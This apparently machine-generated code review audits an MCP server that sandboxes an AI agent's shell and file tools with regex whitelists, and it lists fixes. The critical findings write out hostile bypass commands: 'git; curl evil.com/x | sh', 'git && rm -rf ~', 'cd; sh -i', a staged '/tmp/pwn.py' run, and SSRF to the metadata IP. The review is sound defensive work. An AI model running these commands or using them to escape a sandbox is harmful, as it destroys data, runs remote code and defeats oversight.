# MCP Server Code Review — `mcp-srv/main.go`

**Date:** 2025-07-14  
**Files reviewed:** `main.go`, `base-tool.go`, `text-tool.go`, `utils.go`  
**Build status:** ✅ compiles cleanly (`go build .`)

---

## Overview

`mcp-srv` is an MCP (Model Context Protocol) server that exposes an AI agent a large tool surface: file ops, terminal execution, HTTP fetching, plus optional integrations (Postgres, Playwright/browser, GoDoc, Gmail, Confluence, SVG, RustDoc, Skills). It supports `stdio` (Claude Desktop) and `streamable` HTTP transports. The central design concern is **sandboxing the agent's shell/file access via regex whitelists**.

The architecture is reasonable, the tool descriptions are excellent, and the `LoopGuard` is a nice touch. **However, the security model has a fundamental flaw that defeats its main purpose, plus several functional bugs.**

---

## 🔴 Critical — Command whitelist is trivially bypassable (RCE)

**File:** `base-tool.go` → `runTerminalCommand`

`runTerminalCommand` enforces the command whitelist, then runs the whole string through a shell:

```go
if !regexp.MustCompile(t.AllowedTerminalCommandPattern).MatchString(command) { deny }
...
cmd = exec.Command("sh", "-c", command)   // or cmd /C
```

The default pattern is `^(go|...|git|...|curl|...)[\s]*.*$`. It only checks that the string **starts** with an allowed token; the trailing `.*$` swallows everything else. So any shell operator lets you chain a second, unchecked command:

- `git; curl evil.com/x | sh` → `git` matches the prefix, `; curl ...` is inside `.*`. The path check (`PathPtn`) only flags tokens that *start* with `.`/`/`, and `evil.com/x` has its `/` mid-token, so nothing is flagged. **Executes.**
- `git && rm -rf ~` → the target isn't a `.`/`/`-prefixed token, so the path check misses it. **Executes.**
- `cd; sh -i` → the deliberate "no bare shells" omission (documented in `init()`) is bypassed because `sh` runs as the *second* command, never whitelist-checked.

**The whitelist gates only the first token; `;`, `&&`, `|`, `$(...)`, and backticks all escape it.** This is the whole reason the server exists, and it's open.

**Fix direction:** In `runTerminalCommand`, reject (or don't shell-interpret) any command containing shell metacharacters. Only pass a single, token-checked binary invocation to the shell, or better, validate the *entire* command is one allowed program with plain arguments and never invoke `sh -c` for multi-operator strings.

### Related: `execCommand` has no command whitelist at all

**File:** `base-tool.go` → `execCommand`

`execCommand` is the "no shell" path and uses `shlex.Split` + `exec.Command(cmdSlice[0], ...)` — good that there's no shell. But it **never applies `AllowedTerminalCommandPattern`**; it only checks paths and (non-functional) forbidden strings. So the agent can run *any* binary on `PATH` by name:

- `exec_command(command="python3 /tmp/pwn.py")` → no shell metacharacters → shlex path → runs arbitrary Python. (`python3` is even in the list, but the list is irrelevant here — *no* binary is checked.)
- `exec_command(command="ruby x.rb")` → bypasses the intentional omission of `ruby`.

Combined with `create_new_file` (which *allows* `/tmp`), the agent can **stage a script in `/tmp` and exec it** — a clean RCE chain with no shell involvement.

**Fix:** Apply the same command whitelist to `execCommand`'s resolved binary (`cmdSlice[0]`), not just to `runTerminalCommand`.

---

## 🔴 `ForbiddenString` check is dead code everywhere

**File:** `base-tool.go`

`CheckForbiddenString` returns `(*mcp.CallToolResult, error)`, but **every call site discards the result**:

- `checkPath`: `CheckForbiddenString(path)` — result ignored, then `return nil, nil`.
- `execCommand`: `CheckForbiddenString(command)` — ignored.
- `runTerminalCommand`: `CheckForbiddenString(command)` — ignored.

So `~/.`, `$HOME`, `sudo`, etc. are **never actually blocked**. On top of that the pattern itself is fragile (`` ` ~/. ` `` includes a trailing space, so `~/.ssh` wouldn't match anyway). Either wire the return values into the handlers or delete the mechanism.

---

## 🔴 `stdio` transport is broken by debug output to stdout

**File:** `main.go` → `buildServer`

In stdio mode, **stdout is the JSON-RPC channel**. `buildServer` does:

```go
println("[DEBUG] defaultAllowPath - ", defaultAllowPath)
...
println("[DEBUG] baseTool - ", u.JsonDump(baseTool, ""))
```

`println` writes to **stdout** (unlike `log`, whose default writer is stderr). These lines corrupt the protocol stream and will break the client. **Remove them** (or route to `os.Stderr`).

---

## 🟠 SSRF + no auth + CORS `*` on the HTTP transport

**File:** `main.go` → `main()` (streamable branch), `base-tool.go` → `httpRequest` / `fetchUrl`

- `http_request` / `fetch_url` accept any `http(s)` URL with no IP/hostname filtering → cloud metadata (`http://169.254.169.254/...`), internal hosts, `localhost` admin panels. Classic SSRF.
- The streamable server defaults to `host=0.0.0.0` with **no authentication** and `Access-Control-Allow-Origin: *`. If that port is reachable, it's an unauthenticated RCE/file/SSRF endpoint.

At minimum: bind to `127.0.0.1` by default, add optional auth, and add an SSRF guard (block private/link-local/range and metadata IPs, resolve-before-dial).

Also both `http.Client{}` instances (in `httpRequest` and `fetchAndConvert`) have **no timeout** → a slow/hung remote hangs the handler indefinitely.

---

## 🟠 Unchecked type assertions → server panics (crash on bad input)

**File:** `base-tool.go`

On the network-facing transport, malformed requests can crash the whole server:

- `httpRequest`: `method := args["method"].(string)` and `url := args["url"].(string)` — no comma-ok.
- `execCommand`: `command = c.(string)` — no comma-ok.
- `execCommand`: `shlex.Split("")` → empty slice → `cmdSlice[0]` index-out-of-range panic on `command=""`.

Use comma-ok assertions and guard the empty-args case.

---

## 🟠 `read_file` has no size cap

**File:** `base-tool.go` → `readFileContent` (in `utils.go`)

`readFileContent` → `os.ReadFile` loads the **entire** file into memory and returns it as tool text, with no `MAX_OUPUT_SIZE` cap (unlike `exec`/`http` which cap at 20 KB). A large/sparse file → OOM and context blowout. Cap it like the others.

---

## 🟡 Functional bugs

### `"all"` toolset double-initializes Playwright and double-registers its tools

**File:** `main.go` → `buildServer`

In `buildServer`, both the `"browser"` and `"godoc"` branches fire for `"all"`, each calling `NewPlaywrightProxy()` (spawning a second browser) and `registerPlaywrightTools(s, ...)` a second time (duplicate tool names). Cache the proxy and guard against re-registration.

### `create_new_file` calls `checkPath` twice

**File:** `base-tool.go` → `createNewFile`

Two identical consecutive `if res, err := t.checkPath(cleanPath); err != nil` blocks. Dead duplicate.

### `fileGlobSearch` `max_results=0` returns empty

**File:** `base-tool.go` → `fileGlobSearch`

`max_results` defaults to 100, but if the caller passes `0`, the check `len(matches) >= maxResults` is `len(matches) >= 0` which is always true → returns empty immediately. Clamp to a sane minimum (e.g. treat 0 as "no cap" or default to 100).

### `InsertTextBlock` uses default `bufio.Scanner` (64 KB max line)

**File:** `base-tool.go` → `InsertTextBlock`

Uses a default `bufio.Scanner` (64 KB max token) and will fail on long lines, while `readLines` in `text-tool.go` correctly uses a 10 MB buffer. Make it consistent.

### Toolset help text is stale

**File:** `main.go` → `parseArgs`

`-tools` flag help lists `postgres, octo, browser, godoc, all`, but the code also supports `svg, rustdoc, skills, gmail, confluence`.

---

## 🟡 Robustness / design

### No command timeout / context cancellation

**File:** `base-tool.go` → `execCommand`, `runTerminalCommand`

Both exec paths use `exec.Command` (not `CommandContext`) and ignore the incoming `ctx`. A hung command (`tail -f`, `sleep`, a stalled network op) blocks the handler forever. Wire `ctx` into command cancellation.

### Regexes recompiled on every call

**File:** `base-tool.go` → `checkPath`, `runTerminalCommand`

`checkPath` and `runTerminalCommand` call `regexp.MustCompile(...)` per request. Precompile once (they're admin-set, not per-user). A bad admin regex would also panic at request time rather than startup.

### Loop-guard coverage is inconsistent

**File:** `base-tool.go` → `registerBaseTool`

`read_file`, `fetch_url`, `http_request`, `file_glob_search` aren't wrapped in `guarded()`. The other tools are. Inconsistent protection.

### `init()` allowlist is a large, fragile string-concatenation surface

**File:** `main.go` → `init()`

The code itself admits the `cd`/`cdk` prefix ambiguity. Consider parsing a list and anchoring each token with a word boundary `(^|\s)` + trailing `\s`/boundary, which also incidentally fixes the `.*$` problem.

---

## 🟢 Minor / style

- `MAX_OUPUT_SIZE` — typo (`OUPUT` → `OUTPUT`).
- `gobind` in the allowlist isn't a real Go tool.
- Exported globals (`ForbiddenString`, `defaultAllowCmd`, `PathPtn`) are fine for a single-binary `main`, but worth a note.
- `pathErrorMsg` in the Windows branch says "ONLY RELATIVE PATH TO THE CURRENT DIR AND ONE LEVEL UPPER ARE ALLOWED. EXCEPTIONS ARE ABSOLUTE PATH START FROM TEMP DIR" — slightly inconsistent with the actual pattern which only allows `%TEMP%`, `%TMP%`, `%USERPROFILE%` (not all temp dirs).

---

## 🟢 Positives

- Tool descriptions are genuinely good (the `text_sed` grammar docs, the `run_terminal_command` do/don't examples) — this makes the agent use them correctly.
- `LoopGuard` is a smart, low-cost anti-spin mechanism, and the signature hashing (sorted JSON + sha256) is sound.
- The path-allowlist *intent* is solid (relative-to-cwd + one `../` + `/tmp`), and the segment-level "no `..`" regex correctly closes `../../etc` and `/tmp/../etc`.
- `execCommand` correctly avoids a shell via `shlex.Split`.
- The commented-out, deliberate omissions (bare shells, docker, GCP) with trade-off rationale show good security thinking — the problem is the enforcement, not the design.
- `text-tool.go` is well-structured, well-documented, and the `text_sed` subset is carefully scoped to avoid ambiguity.
- The `LoopGuard` expiry (10 min idle) prevents unbounded memory growth.

---

## Summary / Priority Matrix

| # | Severity | Issue | File |
|---|----------|-------|------|
| 1 | 🔴 Critical | Shell-operator bypass in `runTerminalCommand` | `base-tool.go` |
| 2 | 🔴 Critical | `execCommand` has no command whitelist | `base-tool.go` |
| 3 | 🔴 Critical | `ForbiddenString` check is dead code | `base-tool.go` |
| 4 | 🔴 Critical | `println` to stdout breaks stdio transport | `main.go` |
| 5 | 🟠 High | SSRF: no URL/IP filtering in `http_request`/`fetch_url` | `base-tool.go`, `utils.go` |
| 6 | 🟠 High | No auth + CORS `*` + `0.0.0.0` default on HTTP transport | `main.go` |
| 7 | 🟠 High | No HTTP client timeout | `base-tool.go`, `utils.go` |
| 8 | 🟠 High | Unchecked type assertions → panic on bad input | `base-tool.go` |
| 9 | 🟠 High | `read_file` has no size cap | `base-tool.go` / `utils.go` |
| 10 | 🟡 Medium | `"all"` double-initializes Playwright | `main.go` |
| 11 | 🟡 Medium | `create_new_file` double `checkPath` | `base-tool.go` |
| 12 | 🟡 Medium | `fileGlobSearch` `max_results=0` → empty | `base-tool.go` |
| 13 | 🟡 Medium | `InsertTextBlock` 64 KB scanner limit | `base-tool.go` |
| 14 | 🟡 Medium | Stale `-tools` help text | `main.go` |
| 15 | 🟡 Medium | No command timeout / ctx cancellation | `base-tool.go` |
| 16 | 🟡 Medium | Regex recompiled per request | `base-tool.go` |
| 17 | 🟡 Medium | Loop-guard coverage inconsistent | `base-tool.go` |
| 18 | 🟡 Medium | Fragile string-concat allowlist | `main.go` |
| 19 | 🟢 Low | `MAX_OUPUT_SIZE` typo | `base-tool.go` |
| 20 | 🟢 Low | `gobind` not a real tool | `main.go` |

---

*Generated as a record of the code review session. Use as a checklist for remediation.*
